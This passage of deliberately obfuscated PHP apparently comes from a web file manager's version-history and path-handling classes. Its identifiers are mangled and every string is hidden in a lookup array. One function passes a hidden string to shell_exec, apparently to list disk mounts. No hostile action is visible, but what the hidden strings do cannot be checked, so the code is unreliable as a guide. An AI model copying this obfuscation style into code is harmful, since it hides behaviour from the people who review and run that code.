= array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $®ãŞ¤Ô[1157]); foreach ($ƒÜ„›™¶ as $Ï…æ Ğœ) { if (!$•ŸûÃ³ && substr($¿Ö¯°¥, 0, strlen($Ï…æ Ğœ)) == $Ï…æ Ğœ) { return !1; } } self::log($GLOBALS[$®ãŞ¤Ô[1078]] . $®ãŞ¤Ô[1158] . $¿Ö¯°¥); return $¿Ö¯°¥; } private static function pathHistory($ˆß‰ÇÊÉ) { $ì¡ŞŠÊ =& $_SERVER[Ù×¯Ø…]; $†ÑïÑ®¹ = self::$_historyBase . ltrim(KodIO::clear($ˆß‰ÇÊÉ), $ì¡ŞŠÊ[8]); $†ÑïÑ®¹ = str_replace(array($ì¡ŞŠÊ[1159]), array($ì¡ŞŠÊ[1160]), $†ÑïÑ®¹); return $†ÑïÑ®¹; } public static function log($â‡êƒ–) { } public static function historyCount($¥ş†¨) { $Ğ¶Ë³êÔ =& $_SERVER[Ù×¯Ø…]; $îÓ®“§ó = array(); $Ÿ±Ä°øİ = array(); foreach ($¥ş†¨ as $æ–¸Éş») { $¬”µ£‹Â = get_path_father($æ–¸Éş»); if (!$Ÿ±Ä°øİ[$¬”µ£‹Â]) { $Ÿ±Ä°øİ[$¬”µ£‹Â] = array(); } $Ÿ±Ä°øİ[$¬”µ£‹Â][] = get_path_this($æ–¸Éş»); } foreach ($Ÿ±Ä°øİ as $¬”µ£‹Â => $¯¼¡´ü) { $¨çƒØÑÎ = self::parsePath($¬”µ£‹Â); if (!$¨çƒØÑÎ) { continue; } foreach ($¯¼¡´ü as $œ…’…ÔŒ) { $ŠüŸ²Ï¡ = self::listData(rtrim($¨çƒØÑÎ, $Ğ¶Ë³êÔ[8]) . $Ğ¶Ë³êÔ[8] . $œ…’…ÔŒ, !1); if ($ŠüŸ²Ï¡ && $ŠüŸ²Ï¡[$Ğ¶Ë³êÔ[367]]) { $îÓ®“§ó[rtrim($¬”µ£‹Â, $Ğ¶Ë³êÔ[8]) . $Ğ¶Ë³êÔ[8] . $œ…’…ÔŒ] = count($ŠüŸ²Ï¡[$Ğ¶Ë³êÔ[367]]); } } } return $îÓ®“§ó; } public static function add($¼û”±) { $œ—§Ú·Õ =& $_SERVER[Ù×¯Ø…]; $¤¥’Ã©ƒ = self::listData($¼û”±); if (!$¤¥’Ã©ƒ) { return; } $Ó¿«ªú¾ = Model($œ—§Ú·Õ[769])->get($œ—§Ú·Õ[1161]); $ğ¾Ë›“ş = $GLOBALS[$œ—§Ú·Õ[6]][$œ—§Ú·Õ[88]][$œ—§Ú·Õ[1139]]; $¥Òşˆ§Ä = $Ó¿«ªú¾ == $œ—§Ú·Õ[1162] ? 5 : $ğ¾Ë›“ş; if ($ğ¾Ë›“ş <= 0) { return; } $Ï–±¼Ó = IO::hashSimple($¼û”±); $ïµ„Õğ÷ = IO::info($¼û”±); $»Çìµá÷ = $¤¥’Ã©ƒ[$œ—§Ú·Õ[367]]; if ($ïµ„Õğ÷[$œ—§Ú·Õ[78]] == 0) { return; } if ($ïµ„Õğ÷[$œ—§Ú·Õ[78]] >= 1024 * 1024 * 500) { return !1; } if ($»Çìµá÷ && $»Çìµá÷[0][$œ—§Ú·Õ[171]] == $Ï–±¼Ó) { return !0; } if (array_key_exists($œ—§Ú·Õ[196], $ïµ„Õğ÷) && !$ïµ„Õğ÷[$œ—§Ú·Õ[196]]) { return !1; } $Ë¯Ü¹ÇĞ = short_id(time()); $›Ç¤·Á® = array($œ—§Ú·Õ[395] => $Ë¯Ü¹ÇĞ, $œ—§Ú·Õ[171] => $Ï–±¼Ó, $œ—§Ú·Õ[28] => $ïµ„Õğ÷[$œ—§Ú·Õ[28]] . $œ—§Ú·Õ[95] . date($œ—§Ú·Õ[1163]) . rand_string(1), $œ—§Ú·Õ[78] => $ïµ„Õğ÷[$œ—§Ú·Õ[78]], $œ—§Ú·Õ[455] => USER_ID, $œ—§Ú·Õ[194] => time(), $œ—§Ú·Õ[1164] => $œ—§Ú·Õ[33]); IO::mkdir($¤¥’Ã©ƒ[$œ—§Ú·Õ[1165]]); $‚Âüè¼¸ = IO::copy($¼û”±, $¤¥’Ã©ƒ[$œ—§Ú·Õ[1165]], !1, $›Ç¤·Á®[$œ—§Ú·Õ[28]]); if (!$‚Âüè¼¸) { self::clearEmptyFolder($¤¥’Ã©ƒ[$œ—§Ú·Õ[1165]]); return !1; } array_unshift($»Çìµá÷, $›Ç¤·Á®); if (count($»Çìµá÷) > $¥Òşˆ§Ä) { $ÃĞò ” = array_slice($»Çìµá÷, $¥Òşˆ§Ä); foreach ($ÃĞò ” as $–Ôë‡·•) { IO::remove($¤¥’Ã©ƒ[$œ—§Ú·Õ[1165]] . $–Ôë‡·•[$œ—§Ú·Õ[28]]); } $»Çìµá÷ = array_slice($»Çìµá÷, 0, $¥Òşˆ§Ä); } return self::saveData($¤¥’Ã©ƒ[$œ—§Ú·Õ[1166]], $»Çìµá÷); } public static function remove($›—¥, $ş°®×Øë) { $ÕøïãÅò =& $_SERVER[Ù×¯Ø…]; $¦Ÿ¨Õº = self::listData($›—¥); $©€ìÂ• = array(); if (!$¦Ÿ¨Õº) { return !1; } foreach ($¦Ÿ¨Õº[$ÕøïãÅò[367]] as $¿œö¿Ğ) { if ($¿œö¿Ğ[$ÕøïãÅò[395]] == $ş°®×Øë) { IO::remove($¦Ÿ¨Õº[$ÕøïãÅò[1165]] . $¿œö¿Ğ[$ÕøïãÅò[28]]); continue; } $©€ìÂ•[] = $¿œö¿Ğ; } return self::saveData($¦Ÿ¨Õº[$ÕøïãÅò[1166]], $©€ìÂ•); } public static function clear($†ê¡ô£, $æí°á¤Ú = true) { $İ®¥Õô =& $_SERVER[Ù×¯Ø…]; $¦Èï‘Õü = self::listData($†ê¡ô£, $æí°á¤Ú); if (!$¦Èï‘Õü) { return !1; } foreach ($¦Èï‘Õü[$İ®¥Õô[367]] as $íù°Î­÷) { IO::remove($¦Èï‘Õü[$İ®¥Õô[1165]] . $íù°Î­÷[$İ®¥Õô[28]]); } return self::saveData($¦Èï‘Õü[$İ®¥Õô[1166]], array()); } public static function moveHistory($ïŒ¤üÚ…, $½Äİ„„ë = '', $Ú½¤  ¾ = '') { $·Û½Ì• =& $_SERVER[Ù×¯Ø…]; $şªÜáüµ = self::listData($ïŒ¤üÚ…, !1); if (!$şªÜáüµ || !$şªÜáüµ[$·Û½Ì•[367]]) { return !1; } $½á¶ûó÷ = $·Û½Ì•[1153]; $½Äİ„„ë = $½Äİ„„ë ? $½Äİ„„ë : get_path_this($ïŒ¤üÚ…); $Ú½¤  ¾ = $Ú½¤  ¾ ? $Ú½¤  ¾ : $şªÜáüµ[$·Û½Ì•[1165]]; $ŸŞ§ğÕ = substr(get_path_this($şªÜáüµ[$·Û½Ì•[1166]]), 0, -strlen($½á¶ûó÷)); foreach ($şªÜáüµ[$·Û½Ì•[367]] as $·‚‡˜–Ó => $õë–õÈä) { $§á²ºß… = $½Äİ„„ë . substr($õë–õÈä[$·Û½Ì•[28]], strlen($ŸŞ§ğÕ)); $÷ÌöìÉƒ = IO::move($şªÜáüµ[$·Û½Ì•[1165]] . $õë–õÈä[$·Û½Ì•[28]], $Ú½¤  ¾, !1, $§á²ºß…); if ($÷ÌöìÉƒ) { $şªÜáüµ[$·Û½Ì•[367]][$·‚‡˜–Ó][$·Û½Ì•[28]] = $§á²ºß…; } } $şªÜáüµ[$·Û½Ì•[1166]] = IO::move($şªÜáüµ[$·Û½Ì•[1166]], $Ú½¤  ¾, !1, $½Äİ„„ë . $½á¶ûó÷); self::saveData($şªÜáüµ[$·Û½Ì•[1166]], $şªÜáüµ[$·Û½Ì•[367]]); self::clearEmptyFolder($şªÜáüµ[$·Û½Ì•[1165]]); } public static function rollback($õ£ƒ›¿—, $ªŞ§¥ğé) { $ù¯Û­­Â =& $_SERVER[Ù×¯Ø…]; $—şÓë„ = self::listData($õ£ƒ›¿—); if (!$—şÓë„) { return; } $ö©æß¶ = IO::info($õ£ƒ›¿—); foreach ($—şÓë„[$ù¯Û­­Â[367]] as $œ¬–š¸ø => $İÚåó§¹) { if ($İÚåó§¹[$ù¯Û­­Â[395]] == $ªŞ§¥ğé) { self::add($õ£ƒ›¿—); $ğµö¢Û = $—şÓë„[$ù¯Û­­Â[1165]] . $İÚåó§¹[$ù¯Û­­Â[28]]; $Ã«ü—®ô = IO::copy($ğµö¢Û, IO::pathFather($õ£ƒ›¿—), REPEAT_REPLACE, $ö©æß¶[$ù¯Û­­Â[28]]); if ($Ã«ü—®ô) { self::remove($õ£ƒ›¿—, $ªŞ§¥ğé); } return $Ã«ü—®ô; } } return !1; } public static function setDetail($¹º‚Ö, $¡± Ë¿¥, $¯Œ™Ñ¥ò) { $üÏı‘±İ =& $_SERVER[Ù×¯Ø…]; $½®«¹ò = self::listData($¹º‚Ö); if (!$½®«¹ò) { return; } foreach ($½®«¹ò[$üÏı‘±İ[367]] as $ƒŞ«¹‡á => $¯Ë‚Û±È) { if ($¯Ë‚Û±È[$üÏı‘±İ[395]] == $¡± Ë¿¥) { $½®«¹ò[$üÏı‘±İ[367]][$ƒŞ«¹‡á][$üÏı‘±İ[1164]] = $¯Œ™Ñ¥ò; self::saveData($½®«¹ò[$üÏı‘±İ[1166]], $½®«¹ò[$üÏı‘±İ[367]]); return !0; } } return !1; } public static function fileInfo($–İ®…Ş‰, $£ôŠóå) { $Ç¦¥Ü£² =& $_SERVER[Ù×¯Ø…]; $×Æ§Õ¢ = self::listData($–İ®…Ş‰); if (!$×Æ§Õ¢) { show_json(LNG($Ç¦¥Ü£²[105]), !1); } $éÎ·šöã = $Ç¦¥Ü£²[33]; foreach ($×Æ§Õ¢[$Ç¦¥Ü£²[367]] as $›Ö½¥Çè => $Ìì¸í°) { if ($Ìì¸í°[$Ç¦¥Ü£²[395]] != $£ôŠóå) { continue; } $éÎ·šöã = $×Æ§Õ¢[$Ç¦¥Ü£²[1165]] . $Ìì¸í°[$Ç¦¥Ü£²[28]]; break; } if (!$éÎ·šöã) { show_json(LNG($Ç¦¥Ü£²[105]), !1); } return IO::info($éÎ·šöã); } public static function fileOut($«àÅÉÕ„, $Ûó£‚á½, $œ¹°Ğ™‡ = false) { $Ø‡î¡ÛÛ =& $_SERVER[Ù×¯Ø…]; $ÖĞˆÅ¥µ = self::fileInfo($«àÅÉÕ„, $Ûó£‚á½); $˜ûà¿ÔË =& $GLOBALS[$Ø‡î¡ÛÛ[7]]; $œ¹°Ğ™‡ = isset($˜ûà¿ÔË[$Ø‡î¡ÛÛ[1129]]) && $˜ûà¿ÔË[$Ø‡î¡ÛÛ[1129]] == 1; if (isset($˜ûà¿ÔË[$Ø‡î¡ÛÛ[29]]) && $˜ûà¿ÔË[$Ø‡î¡ÛÛ[29]] == $Ø‡î¡ÛÛ[1167]) { return IO::fileOutImage($ÖĞˆÅ¥µ[$Ø‡î¡ÛÛ[76]], $˜ûà¿ÔË[$Ø‡î¡ÛÛ[1168]]); } IO::fileOut($ÖĞˆÅ¥µ[$Ø‡î¡ÛÛ[76]], $œ¹°Ğ™‡, get_path_this($«àÅÉÕ„)); } public static function listData($şÏ€©Á, $•˜ª„Ø§ = true) { $âç¨ê =& $_SERVER[Ù×¯Ø…]; if ($•˜ª„Ø§ && !IO::exist($şÏ€©Á)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($şÏ€©Á, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ôúõŞõ = self::pathHistory($şÏ€©Á); $©ÍÇ¸Ÿ¨ = array($âç¨ê[1166] => $ôúõŞõ . $âç¨ê[1153], $âç¨ê[1165] => rtrim(get_path_father($ôúõŞõ), $âç¨ê[8]) . $âç¨ê[8], $âç¨ê[367] => array()); $¼Û¶ëÇÈ = IO::getContent($©ÍÇ¸Ÿ¨[$âç¨ê[1166]]); if ($¼Û¶ëÇÈ) { $¾æ½Š = json_decode($¼Û¶ëÇÈ, !0); if (is_array($¾æ½Š)) { $©ÍÇ¸Ÿ¨[$âç¨ê[367]] = $¾æ½Š; } } return $©ÍÇ¸Ÿ¨; } private static function saveData($ºèÓ­š›, $Åê¹şƒó) { $ÕŸ¢ğ•ª =& $_SERVER[Ù×¯Ø…]; self::log($ÕŸ¢ğ•ª[1169] . $ºèÓ­š› . $ÕŸ¢ğ•ª[68] . count($Åê¹şƒó), $ÕŸ¢ğ•ª[751]); if ($Åê¹şƒó) { return IO::setContent($ºèÓ­š›, json_encode($Åê¹şƒó)); } $Öè­‹±Õ = IO::pathFather($ºèÓ­š›); IO::remove($ºèÓ­š›); self::clearEmptyFolder($Öè­‹±Õ); return !0; } public static function clearEmptyFolder($ÎòšÛ‚) { $ªØß¶ê§ =& $_SERVER[Ù×¯Ø…]; if (trim($ÎòšÛ‚, $ªØß¶ê§[8]) == trim(self::$_historyBase, $ªØß¶ê§[8])) { return; } $»‚„úº = IO::pathFather($ÎòšÛ‚); $ÒŒÊïñå = IO::has($ÎòšÛ‚, !0); if ($ÒŒÊïñå[$ªØß¶ê§[203]] > 0 || $ÒŒÊïñå[$ªØß¶ê§[204]] > 0) { return; } IO::remove($ÎòšÛ‚); self::clearEmptyFolder($»‚„úº); } private static function getBasePath() { $œÜ²À÷ã =& $_SERVER[Ù×¯Ø…]; $ª¿¬Ÿ¸º = Model($œÜ²À÷ã[1170])->get($œÜ²À÷ã[1171]); if ($ª¿¬Ÿ¸º) { if (!IO::exist($ª¿¬Ÿ¸º)) { IO::mkdir($ª¿¬Ÿ¸º); } if (get_path_this($ª¿¬Ÿ¸º) == $œÜ²À÷ã[1156]) { $ò‹•¦Ò = $œÜ²À÷ã[1172] . rand_string(8); @rename($ª¿¬Ÿ¸º, get_path_father($ª¿¬Ÿ¸º) . $œÜ²À÷ã[8] . $ò‹•¦Ò); $ª¿¬Ÿ¸º = DATA_PATH . $ò‹•¦Ò . $œÜ²À÷ã[8]; file_put_contents(DATA_PATH . $œÜ²À÷ã[1173], $œÜ²À÷ã[33]); Model($œÜ²À÷ã[1170])->set($œÜ²À÷ã[1171], $ª¿¬Ÿ¸º); } return $ª¿¬Ÿ¸º; } $ª¿¬Ÿ¸º = DATA_PATH . $œÜ²À÷ã[1172] . rand_string(8) . $œÜ²À÷ã[8]; $ª¿¬Ÿ¸º = IO::mkdir($ª¿¬Ÿ¸º); $ª¿¬Ÿ¸º = rtrim($ª¿¬Ÿ¸º, $œÜ²À÷ã[8]) . $œÜ²À÷ã[8]; file_put_contents($ª¿¬Ÿ¸º . $œÜ²À÷ã[1173], $œÜ²À÷ã[33]); file_put_contents(DATA_PATH . $œÜ²À÷ã[1173], $œÜ²À÷ã[33]); Model($œÜ²À÷ã[1170])->set($œÜ²À÷ã[1171], $ª¿¬Ÿ¸º); return $ª¿¬Ÿ¸º; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\165\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\x72\122\145\x63\171\x63\154\145\175"; const KOD_USER_FAV = "\173\x75\163\x65\162\x46\x61\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\162\106\x69\154\x65\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\x72\x46\x69\x6c\x65\124\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\x75\160\122\157\157\x74\x53\145\154\x66\175"; const KOD_USER_SHARE = "\x7b\165\x73\145\x72\x53\x68\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\x72\x53\x68\141\x72\145\114\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\141\x72\x65\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\x72\x65\x49\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\x73\x68\141\162\145\111\x74\x65\x6d\x4c\151\x6e\x6b\175"; const KOD_SEARCH = "\173\x73\145\x61\x72\143\x68\175"; const KOD_BLOCK = "\x7b\142\154\x6f\143\x6b\175"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\163\145\x72\122\145\156\x63\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\x69\166\x65\162\175"; public static function typeList() { $Ñ´ÜµêÓ =& $_SERVER[Ù×¯Ø…]; return array($Ñ´ÜµêÓ[1174] => self::KOD_SOURCE, $Ñ´ÜµêÓ[1175] => self::KOD_USER_RECYCLE, $Ñ´ÜµêÓ[1176] => self::KOD_USER_FAV, $Ñ´ÜµêÓ[1177] => self::KOD_USER_FILE_TAG, $Ñ´ÜµêÓ[1178] => self::KOD_USER_FILE_TYPE, $Ñ´ÜµêÓ[1179] => self::KOD_GROUP_ROOT_SELF, $Ñ´ÜµêÓ[1180] => self::KOD_USER_SHARE, $Ñ´ÜµêÓ[1181] => self::KOD_USER_SHARE_LINK, $Ñ´ÜµêÓ[1182] => self::KOD_USER_SHARE_TO_ME, $Ñ´ÜµêÓ[1183] => self::KOD_SHARE_ITEM, $Ñ´ÜµêÓ[1184] => self::KOD_SHARE_LINK, $Ñ´ÜµêÓ[1185] => self::KOD_SEARCH, $Ñ´ÜµêÓ[1186] => self::KOD_BLOCK, $Ñ´ÜµêÓ[1187] => self::KOD_IO, $Ñ´ÜµêÓ[1188] => self::KOD_USER_RECENT, $Ñ´ÜµêÓ[1189] => self::KOD_USER_DRIVER); } public static function parse($ãˆ•º›ë) { $ä¨º‰Ô« =& $_SERVER[Ù×¯Ø…]; $ãˆ•º›ë = self::clear($ãˆ•º›ë); $ššŠ¥Øî = array_values(self::typeList()); preg_match($ä¨º‰Ô«[1190], $ãˆ•º›ë, $à²Ô¨Àº); $©¤œûı = array($ä¨º‰Ô«[426] => !1, $ä¨º‰Ô«[1191] => !1, $ä¨º‰Ô«[423] => !1, $ä¨º‰Ô«[76] => $ãˆ•º›ë, $ä¨º‰Ô«[1100] => !1, $ä¨º‰Ô«[1099] => $ä¨º‰Ô«[33]); if (is_array($à²Ô¨Àº) && count($à²Ô¨Àº) == 5) { $î‚˜ûª = $ä¨º‰Ô«[1192] . $à²Ô¨Àº[2] . $ä¨º‰Ô«[325]; if (in_array($î‚˜ûª, $ššŠ¥Øî)) { $©¤œûı[$ä¨º‰Ô«[1100]] = $à²Ô¨Àº[1]; $©¤œûı[$ä¨º‰Ô«[29]] = $î‚˜ûª; $©¤œûı[$ä¨º‰Ô«[1193]] = substr($î‚˜ûª, 1, -1); $©¤œûı[$ä¨º‰Ô«[395]] = $à²Ô¨Àº[3]; } $©¤œûı[$ä¨º‰Ô«[1099]] = $à²Ô¨Àº[4]; } $‚ö„«„² = array($ä¨º‰Ô«[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $©¤œûı[$ä¨º‰Ô«[1155]] = in_array($©¤œûı[$ä¨º‰Ô«[29]], $‚ö„«„²); return $©¤œûı; } public static function isTruePath($¾ØôË½) { $ùŠÛ»â =& $_SERVER[Ù×¯Ø…]; if (substr($¾ØôË½, 0, 1) != $ùŠÛ»â[1192]) { return !0; } if (strpos($¾ØôË½, $ùŠÛ»â[412]) === 0) { return !0; } if (strpos($¾ØôË½, $ùŠÛ»â[1159]) === 0) { return !0; } if (strpos($¾ØôË½, $ùŠÛ»â[1194]) === 0) { return !0; } if (strpos($¾ØôË½, $ùŠÛ»â[1195]) === 0) { return !0; } if (strpos($¾ØôË½, $ùŠÛ»â[1196]) === 0) { return !0; } return !1; } public static function clear($Ô…íë¸­) { $à¬ÖÀ¸Ù =& $_SERVER[Ù×¯Ø…]; $Ô…íë¸­ = str_replace(array($à¬ÖÀ¸Ù[1073], $à¬ÖÀ¸Ù[229]), $à¬ÖÀ¸Ù[50], $Ô…íë¸­); $Ô…íë¸­ = str_replace($à¬ÖÀ¸Ù[97], $à¬ÖÀ¸Ù[8], $Ô…íë¸­); $Á€Çá = $à¬ÖÀ¸Ù[1197]; if (substr($Ô…íë¸­, 0, 3) == $à¬ÖÀ¸Ù[1198]) { $Ô…íë¸­ = substr($Ô…íë¸­, 3); } while (strstr($Ô…íë¸­, $Á€Çá)) { $Ô…íë¸­ = str_replace($Á€Çá, $à¬ÖÀ¸Ù[8], $Ô…íë¸­); } $Ô…íë¸­ = preg_replace($à¬ÖÀ¸Ù[1199], $à¬ÖÀ¸Ù[8], $Ô…íë¸­); if ($Ô…íë¸­ == $à¬ÖÀ¸Ù[8]) { return $à¬ÖÀ¸Ù[8]; } $Ô…íë¸­ = rtrim($Ô…íë¸­, $à¬ÖÀ¸Ù[8]); return $Ô…íë¸­; } public static function sourceID($œ¥Ö´”£) { $ğôÕé¨Â =& $_SERVER[Ù×¯Ø…]; $ğè…“¥Ô = self::parse($œ¥Ö´”£); if ($ğè…“¥Ô[$ğôÕé¨Â[29]] !== self::KOD_SOURCE) { show_json(LNG($ğôÕé¨Â[1200]), !1); } return $ğè…“¥Ô[$ğôÕé¨Â[395]]; } public static function make($ìµåìë) { if (!$ìµåìë) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ìµåìë)); } public static function makeShare($™„“œ½…, $›¯Û“Õ–) { return self::makePath(self::KOD_SHARE_ITEM, $™„“œ½…, $›¯Û“Õ–); } public static function makeFileTypePath($Ôû±à˜¬) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ôû±à˜¬); } public static function makeFileTagPath($†›ªşñ) { return self::makePath(self::KOD_USER_FILE_TAG, $†›ªşñ); } public static function makePath($ÇèøÎÉ, $èâŸ¬ñ’ = '', $ Şèğº = '') { $ç”ç¬š” =& $_SERVER[Ù×¯Ø…]; $ÂåŒõåÄ = substr($ÇèøÎÉ, 1, -1); $É¹Åˆ‚ = $ç”ç¬š”[1201] . $ÂåŒõåÄ . $ç”ç¬š”[1202] . $èâŸ¬ñ’ . $ç”ç¬š”[1203]; $É¹Åˆ‚ = $ Şèğº ? $É¹Åˆ‚ . $ Şèğº . $ç”ç¬š”[8] : $É¹Åˆ‚; return $É¹Åˆ‚; } public static function hashPath($ÊÊ×õöŸ, $ÇÊ ¡Óí = true) { $Ú¨à°ÈĞ =& $_SERVER[Ù×¯Ø…]; $¿Û‰¬˜É = is_array($ÊÊ×õöŸ) ? $ÊÊ×õöŸ : IO::info($ÊÊ×õöŸ); $úüš‚¡ = _get($¿Û‰¬˜É, $Ú¨à°ÈĞ[1204], $Ú¨à°ÈĞ[33]); if (!$úüš‚¡ && isset($¿Û‰¬˜É[$Ú¨à°ÈĞ[406]])) { $¿Û‰¬˜É = IO::info(KodIO::make($¿Û‰¬˜É[$Ú¨à°ÈĞ[406]])); $úüš‚¡ = _get($¿Û‰¬˜É, $Ú¨à°ÈĞ[1204], $Ú¨à°ÈĞ[33]); } if (!$úüš‚¡ && $ÇÊ ¡Óí) { $’ù»Òå = KodIO::parse($¿Û‰¬˜É[$Ú¨à°ÈĞ[76]]); if (!$’ù»Òå[$Ú¨à°ÈĞ[29]]) { $úüš‚¡ = IO::hashSimple($¿Û‰¬˜É[$Ú¨à°ÈĞ[76]]); } } if (!$úüš‚¡) { $úüš‚¡ = md5($¿Û‰¬˜É[$Ú¨à°ÈĞ[76]] . $¿Û‰¬˜É[$Ú¨à°ÈĞ[78]] . $¿Û‰¬˜É[$Ú¨à°ÈĞ[84]]); } return $úüš‚¡; } public static function initSystemPath() { $èøô¯ıÔ =& $_SERVER[Ù×¯Ø…]; if (defined($èøô¯ıÔ[1205])) { return; } define($èøô¯ıÔ[1205], self::systemPath($èøô¯ıÔ[1206])); define($èøô¯ıÔ[1207], self::systemPath($èøô¯ıÔ[1208])); define($èøô¯ıÔ[1209], self::systemPath($èøô¯ıÔ[1210])); define($èøô¯ıÔ[1211], self::systemPath($èøô¯ıÔ[1212])); IOHistory::bindEvent(); } public static function systemPath($†ıÁØ°š) { $µŒ‡ÏøÁ =& $_SERVER[Ù×¯Ø…]; $šºˆø… = $µŒ‡ÏøÁ[1213] . ucfirst($†ıÁØ°š); $ˆØ¾§ıæ = Model($µŒ‡ÏøÁ[769])->get($šºˆø…); if ($ˆØ¾§ıæ) { return $ˆØ¾§ıæ; } if ($†ıÁØ°š == $µŒ‡ÏøÁ[1206]) { $ˆØ¾§ıæ = self::make(Model($µŒ‡ÏøÁ[831])->systemRootPathAdd($µŒ‡ÏøÁ[540])); } else { $ˆØ¾§ıæ = self::systemPath($µŒ‡ÏøÁ[1206]); $Â¥æÚ±ï = self::sourceID($ˆØ¾§ıæ); $ˆØ¾§ıæ = self::make(Model($µŒ‡ÏøÁ[831])->mkdir($Â¥æÚ±ï, $†ıÁØ°š)); } Model($µŒ‡ÏøÁ[769])->set($šºˆø…, $ˆØ¾§ıæ); return $ˆØ¾§ıæ; } public static function systemFolder($è¾ı€€í) { $Š¾ÈÉ×İ = IO_PATH_SYSTEM_SOURCE . $è¾ı€€í; $Ô‡¹Ïâ¹ = Cache::get($Š¾ÈÉ×İ); if (!$Ô‡¹Ïâ¹) { $ú„³òŠÔ = IO::infoFull($Š¾ÈÉ×İ); if (!$ú„³òŠÔ) { $Ô‡¹Ïâ¹ = IO::mkdir($Š¾ÈÉ×İ, REPEAT_SKIP); } else { $Ô‡¹Ïâ¹ = $ú„³òŠÔ[$_SERVER[Ù×¯Ø…][76]]; } Cache::set($Š¾ÈÉ×İ, $Ô‡¹Ïâ¹, 3600 * 10); } return $Ô‡¹Ïâ¹; } public static function defaultDriver() { return Model($_SERVER[Ù×¯Ø…][766])->defaultDriver(); } public static function defaultIO() { $™»Šª°¨ =& $_SERVER[Ù×¯Ø…]; $Â ¥Ğ½ = self::defaultDriver(); return $™»Šª°¨[1214] . $Â ¥Ğ½[$™»Šª°¨[395]] . $™»Šª°¨[1203]; } public static function defaultDriverInit() { static $À±Ñ¿ÎŒ = false; if ($À±Ñ¿ÎŒ) { return $À±Ñ¿ÎŒ; } $À±Ñ¿ÎŒ = IO::init(self::defaultIO()); return $À±Ñ¿ÎŒ; } public static function fileTypeList() { $§°òºî =& $_SERVER[Ù×¯Ø…]; $áõÔİ = $GLOBALS[$§°òºî[6]][$§°òºî[1215]]; foreach ($áõÔİ as $””–€Â— => $åœÊŸï) { $öÍåçòÈ = $§°òºî[1216] . $””–€Â—; $Õ£‘´Á = LNG($öÍåçòÈ); if ($öÍåçòÈ != $Õ£‘´Á) { $áõÔİ[$””–€Â—][$§°òºî[28]] = $Õ£‘´Á; } } return $áõÔİ; } public static function diskList($¿Ñ±ñ = true) { $¾½ãÀëµ = $_SERVER[Ù×¯Ø…][1217]; if ($¿Ñ±ñ) { $û–×æÔ = Cache::get($¾½ãÀëµ); if (is_array($û–×æÔ)) { return $û–×æÔ; } } $û–×æÔ = self::diskListGet(); Cache::set($¾½ãÀëµ, $û–×æÔ, 3600); return $û–×æÔ; } public static function diskListGet() { $Í™¿ŠÂÙ =& $_SERVER[Ù×¯Ø…]; $¸¢èˆ«¡ = array(); if ($GLOBALS[$Í™¿ŠÂÙ[6]][$Í™¿ŠÂÙ[1218]] == $Í™¿ŠÂÙ[1219]) { $Ç„¯ñ = $Í™¿ŠÂÙ[1220]; for ($ÏÚ‡¹Å€ = 0; $ÏÚ‡¹Å€ < strlen($Ç„¯ñ); $ÏÚ‡¹Å€++) { $€îŸå‡Ÿ = $Ç„¯ñ[$ÏÚ‡¹Å€] . $Í™¿ŠÂÙ[1221]; if (file_exists($€îŸå‡Ÿ)) { $¸¢èˆ«¡[] = $€îŸå‡Ÿ; } } return $¸¢èˆ«¡; } if (!function_exists($Í™¿ŠÂÙ[98])) { $¸¢èˆ«¡[] = $Í™¿ŠÂÙ[841]; return $¸¢èˆ«¡; } $Í–Ê²óú = explode($Í™¿ŠÂÙ[229], shell_exec($Í™¿ŠÂÙ[1222])); array_shift($Í–Ê²óú); array_pop($Í–Ê²óú); $«£— Š¼ = array($Í™¿ŠÂÙ[1223], $Í™¿ŠÂÙ[1224], $Í™¿ŠÂÙ[1225], $Í™¿ŠÂÙ[1226]); foreach ($Í–Ê²óú as $‡‘Ô¤êÏ) { $Ú”×Îş­ = preg_split($Í™¿ŠÂÙ[1227], $‡‘Ô¤êÏ); $€îŸå‡Ÿ = $Ú”×Îş­[count($Ú”×Îş­) - 1]; if (!strstr($Ú”×Îş­[0], $Í™¿ŠÂÙ[1228])) { continue; } if (!$€îŸå‡Ÿ || in_array($€îŸå‡Ÿ, $«£— Š¼)) { continue; } $¸¢èˆ«¡[] = rtrim($€îŸå‡Ÿ, $Í™¿ŠÂÙ[8]) . $Í™¿ŠÂÙ[8]; } return $¸¢èˆ«¡; } public static function isSameDisk($í»¤‘®¶, $é™Ã•¼Î) { $–î·ßü± =& $_SERVER[Ù×¯Ø…]; if ($GLOBALS[$–î·ßü±[6]][$–î·ßü±[1218]] == $–î·ßü±[1219]) { return strtolower(substr($í»¤‘®¶, 0, 1)) == strtolower(substr($é™Ã•¼Î, 0, 1)); } $õŞ‘â¯¨ = self::diskList(); $ñØšìÔá = !1; $Ø½·Íø€ = !1; sort($õŞ‘â¯¨); $õŞ‘â¯¨ = array_reverse($õŞ‘â¯¨); $í»¤‘®¶ = rtrim($í»¤‘®¶, $–î·ßü±[8]) . $–î·ßü±[8]; $é™Ã•¼Î = rtrim($é™Ã•¼Î, $–î·ßü±[8]) . $–î·ßü±[8]; foreach ($õŞ‘â¯¨ as $¨¼Óªêø) { $¬€åôïÈ = strlen($¨¼Óªêø); if (!$ñØšìÔá && substr($í»¤‘®¶, 0, $¬€åôïÈ) == $¨¼Óªêø) { $ñØšìÔá = $¨¼Óªêø; } if (!$Ø½·Íø€ && substr($é™Ã•¼Î, 0, 